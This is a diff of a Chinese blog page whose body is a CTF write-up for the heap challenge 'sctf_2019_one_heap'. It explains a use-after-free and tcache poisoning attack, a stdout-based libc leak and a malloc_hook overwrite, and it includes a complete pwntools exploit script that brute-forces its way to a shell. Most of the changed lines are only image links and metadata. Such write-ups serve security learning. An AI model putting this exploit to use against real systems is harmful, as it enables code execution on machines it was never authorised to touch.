@@ -20,22 +20,22 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="写在前面：在之前做这道题的时候SWPUCTF_2019_p1KkHeap,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。 保护策略： 漏洞所在&amp;&amp;程序分析：漏洞所在：存">
+    <meta name="description" content="写在前面：在之前做这道题的时候SWPUCTF_2019_p1KkHeap,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sctf_2019_one_heap">
 <meta property="og:url" content="https://zikh26.github.io/posts/7136f841.html">
 <meta property="og:site_name" content="ZIKH26&#39;s Blog">
-<meta property="og:description" content="写在前面：在之前做这道题的时候SWPUCTF_2019_p1KkHeap,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。 保护策略： 漏洞所在&amp;&amp;程序分析：漏洞所在：存">
+<meta property="og:description" content="写在前面：在之前做这道题的时候SWPUCTF_2019_p1KkHeap,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232122044-1074256165.png">
 <meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232138391-1671777028.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232153979-37464762.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232210264-1357791408.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232221927-1023812391.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011840157.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914303.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914926.png">
 <meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232259398-1658522953.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220904232314524-847895521.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011915114.png">
 <meta property="article:published_time" content="2023-05-14T23:36:47.548Z">
-<meta property="article:modified_time" content="2022-10-08T02:24:48.414Z">
+<meta property="article:modified_time" content="2023-07-01T11:15:36.439Z">
 <meta property="article:author" content="ZIKH26">
 <meta property="article:tag" content="爆破tcache_perthread_struct">
 <meta name="twitter:card" content="summary">
@@ -136,7 +136,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">96</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -147,7 +147,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">100</span>
+        <span class="site-state-item-count">99</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -210,7 +210,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:15:36" itemprop="dateModified" datetime="2023-07-01T19:15:36+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -232,6 +232,8 @@
     
     
     <div class="post-body" itemprop="articleBody"><h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>在之前做这道题的时候<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16632897.html">SWPUCTF_2019_p1KkHeap</a>,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。</p>
+<span id="more"></span>
+
 <h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220904232122044-1074256165.png"></p>
 <h2 id="漏洞所在-amp-amp-程序分析："><a href="#漏洞所在-amp-amp-程序分析：" class="headerlink" title="漏洞所在&amp;&amp;程序分析："></a>漏洞所在&amp;&amp;程序分析：</h2><h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>存在UAF漏洞如下：</p>
 <p><img src="/../img/2706180-20220904232138391-1671777028.png"></p>
@@ -240,12 +242,12 @@
 <h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><h3 id="tcache-struct-attack："><a href="#tcache-struct-attack：" class="headerlink" title="tcache_struct_attack："></a>tcache_struct_attack：</h3><p>存在UAF漏洞，我们打一个tcache dup。由于tcache_perthread_struct结构体是和分配出来的堆块存在固定偏移，因此tcache poisoning去修改末尾两个字节即可，改为x000(x我们需要爆破一下，概率为1&#x2F;16，调试的时候关闭ASLR就不用爆破了)。</p>
 <p>当爆破成功时，我们就可以将tcache_perthread_struct申请出来了，然后我们就可以控制任意tcache链表中的头指针，以及链表中堆块的数量。</p>
 <p>接着我们修改0x250这条链上的count为7，我们将刚刚申请出来的tcache_perthread_struct给释放掉，该堆块的大小为0x250，由于0x250这条链上的count为7了，所以再次释放就进入了unsorted bin中。（如下图） </p>
-<p><img src="/../img/2706180-20220904232153979-37464762.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011840157.png" alt="image-20230701184011816"></p>
 <p>由于下次从这个0x250堆块中分割一定的内存，就可以让unsorted bin中的fd和bk指针落在我们想要的tcache链上。接着再次申请0x10的内存，这样就可以去编辑刚刚的fd和bk指针了，这里我们去编辑bk指针，将其修改为stdout地址(需要爆破)，然后再次释放掉这个0x10的堆块，让其进入fastbin中，等之后使用。</p>
 <p>编辑前后，如下图</p>
-<p><img src="/../img/2706180-20220904232210264-1357791408.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914303.png" alt="image-20230701191427000"></p>
 <p>下图是我做出来之后，懒的再关闭ASLR了，所以直接set改了一下内存值。</p>
-<p><img src="/../img/2706180-20220904232221927-1023812391.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914926.png" alt="image-20230701191444666"></p>
 <p>然后我们申请一个0x60大小的堆块，就可以申请出来stdout结构体了，打io leak泄露libc地址。</p>
 <p>由于之前我们释放了那个0x10的堆块，此时我们再申请回来(它一直在fastbin中),这次写入malloc_hook-8的地址(因为one_gadget都不通，只能用realloc函数来调整栈帧了)</p>
 <p>如下图，此时的realloc_hook已经出来了，只要我们申请0x50的堆块，就可以去编辑它了。</p>
@@ -257,7 +259,7 @@
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x98C</span></span><br><span class="line">d_a=<span class="number">0x99F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,0xDB5,0xD2B)</span></span><br><span class="line">    add(<span class="number">0x7f</span>,p16(<span class="number">0xc010</span>))</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    payload=tcache_struct_attack(&#123;<span class="number">0x250</span>:<span class="number">7</span>,<span class="number">0x130</span>:<span class="number">1</span>&#125;)</span><br><span class="line">    add(<span class="number">0x7f</span>,payload)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x6760</span>))</span><br><span class="line">    </span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_base&amp;<span class="number">0xfff</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;success!!!&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one_gadget+libc_base)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    log(<span class="string">&#x27;Number of blasting&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">    p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>这里是爆了355次才出来….</p>
-<p><img src="/../img/2706180-20220904232314524-847895521.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011915114.png" alt="image-20230701191518858"></p>
 
     </div>
 
@@ -274,8 +276,8 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/afe33925.html" rel="prev" title="sctf_2019_easy_heap">
-                  <i class="fa fa-chevron-left"></i> sctf_2019_easy_heap
+                <a href="/posts/501cca6.html" rel="prev" title="Safe-Linking 机制的绕过">
+                  <i class="fa fa-chevron-left"></i> Safe-Linking 机制的绕过
                 </a>
             </div>
             <div class="post-nav-item">
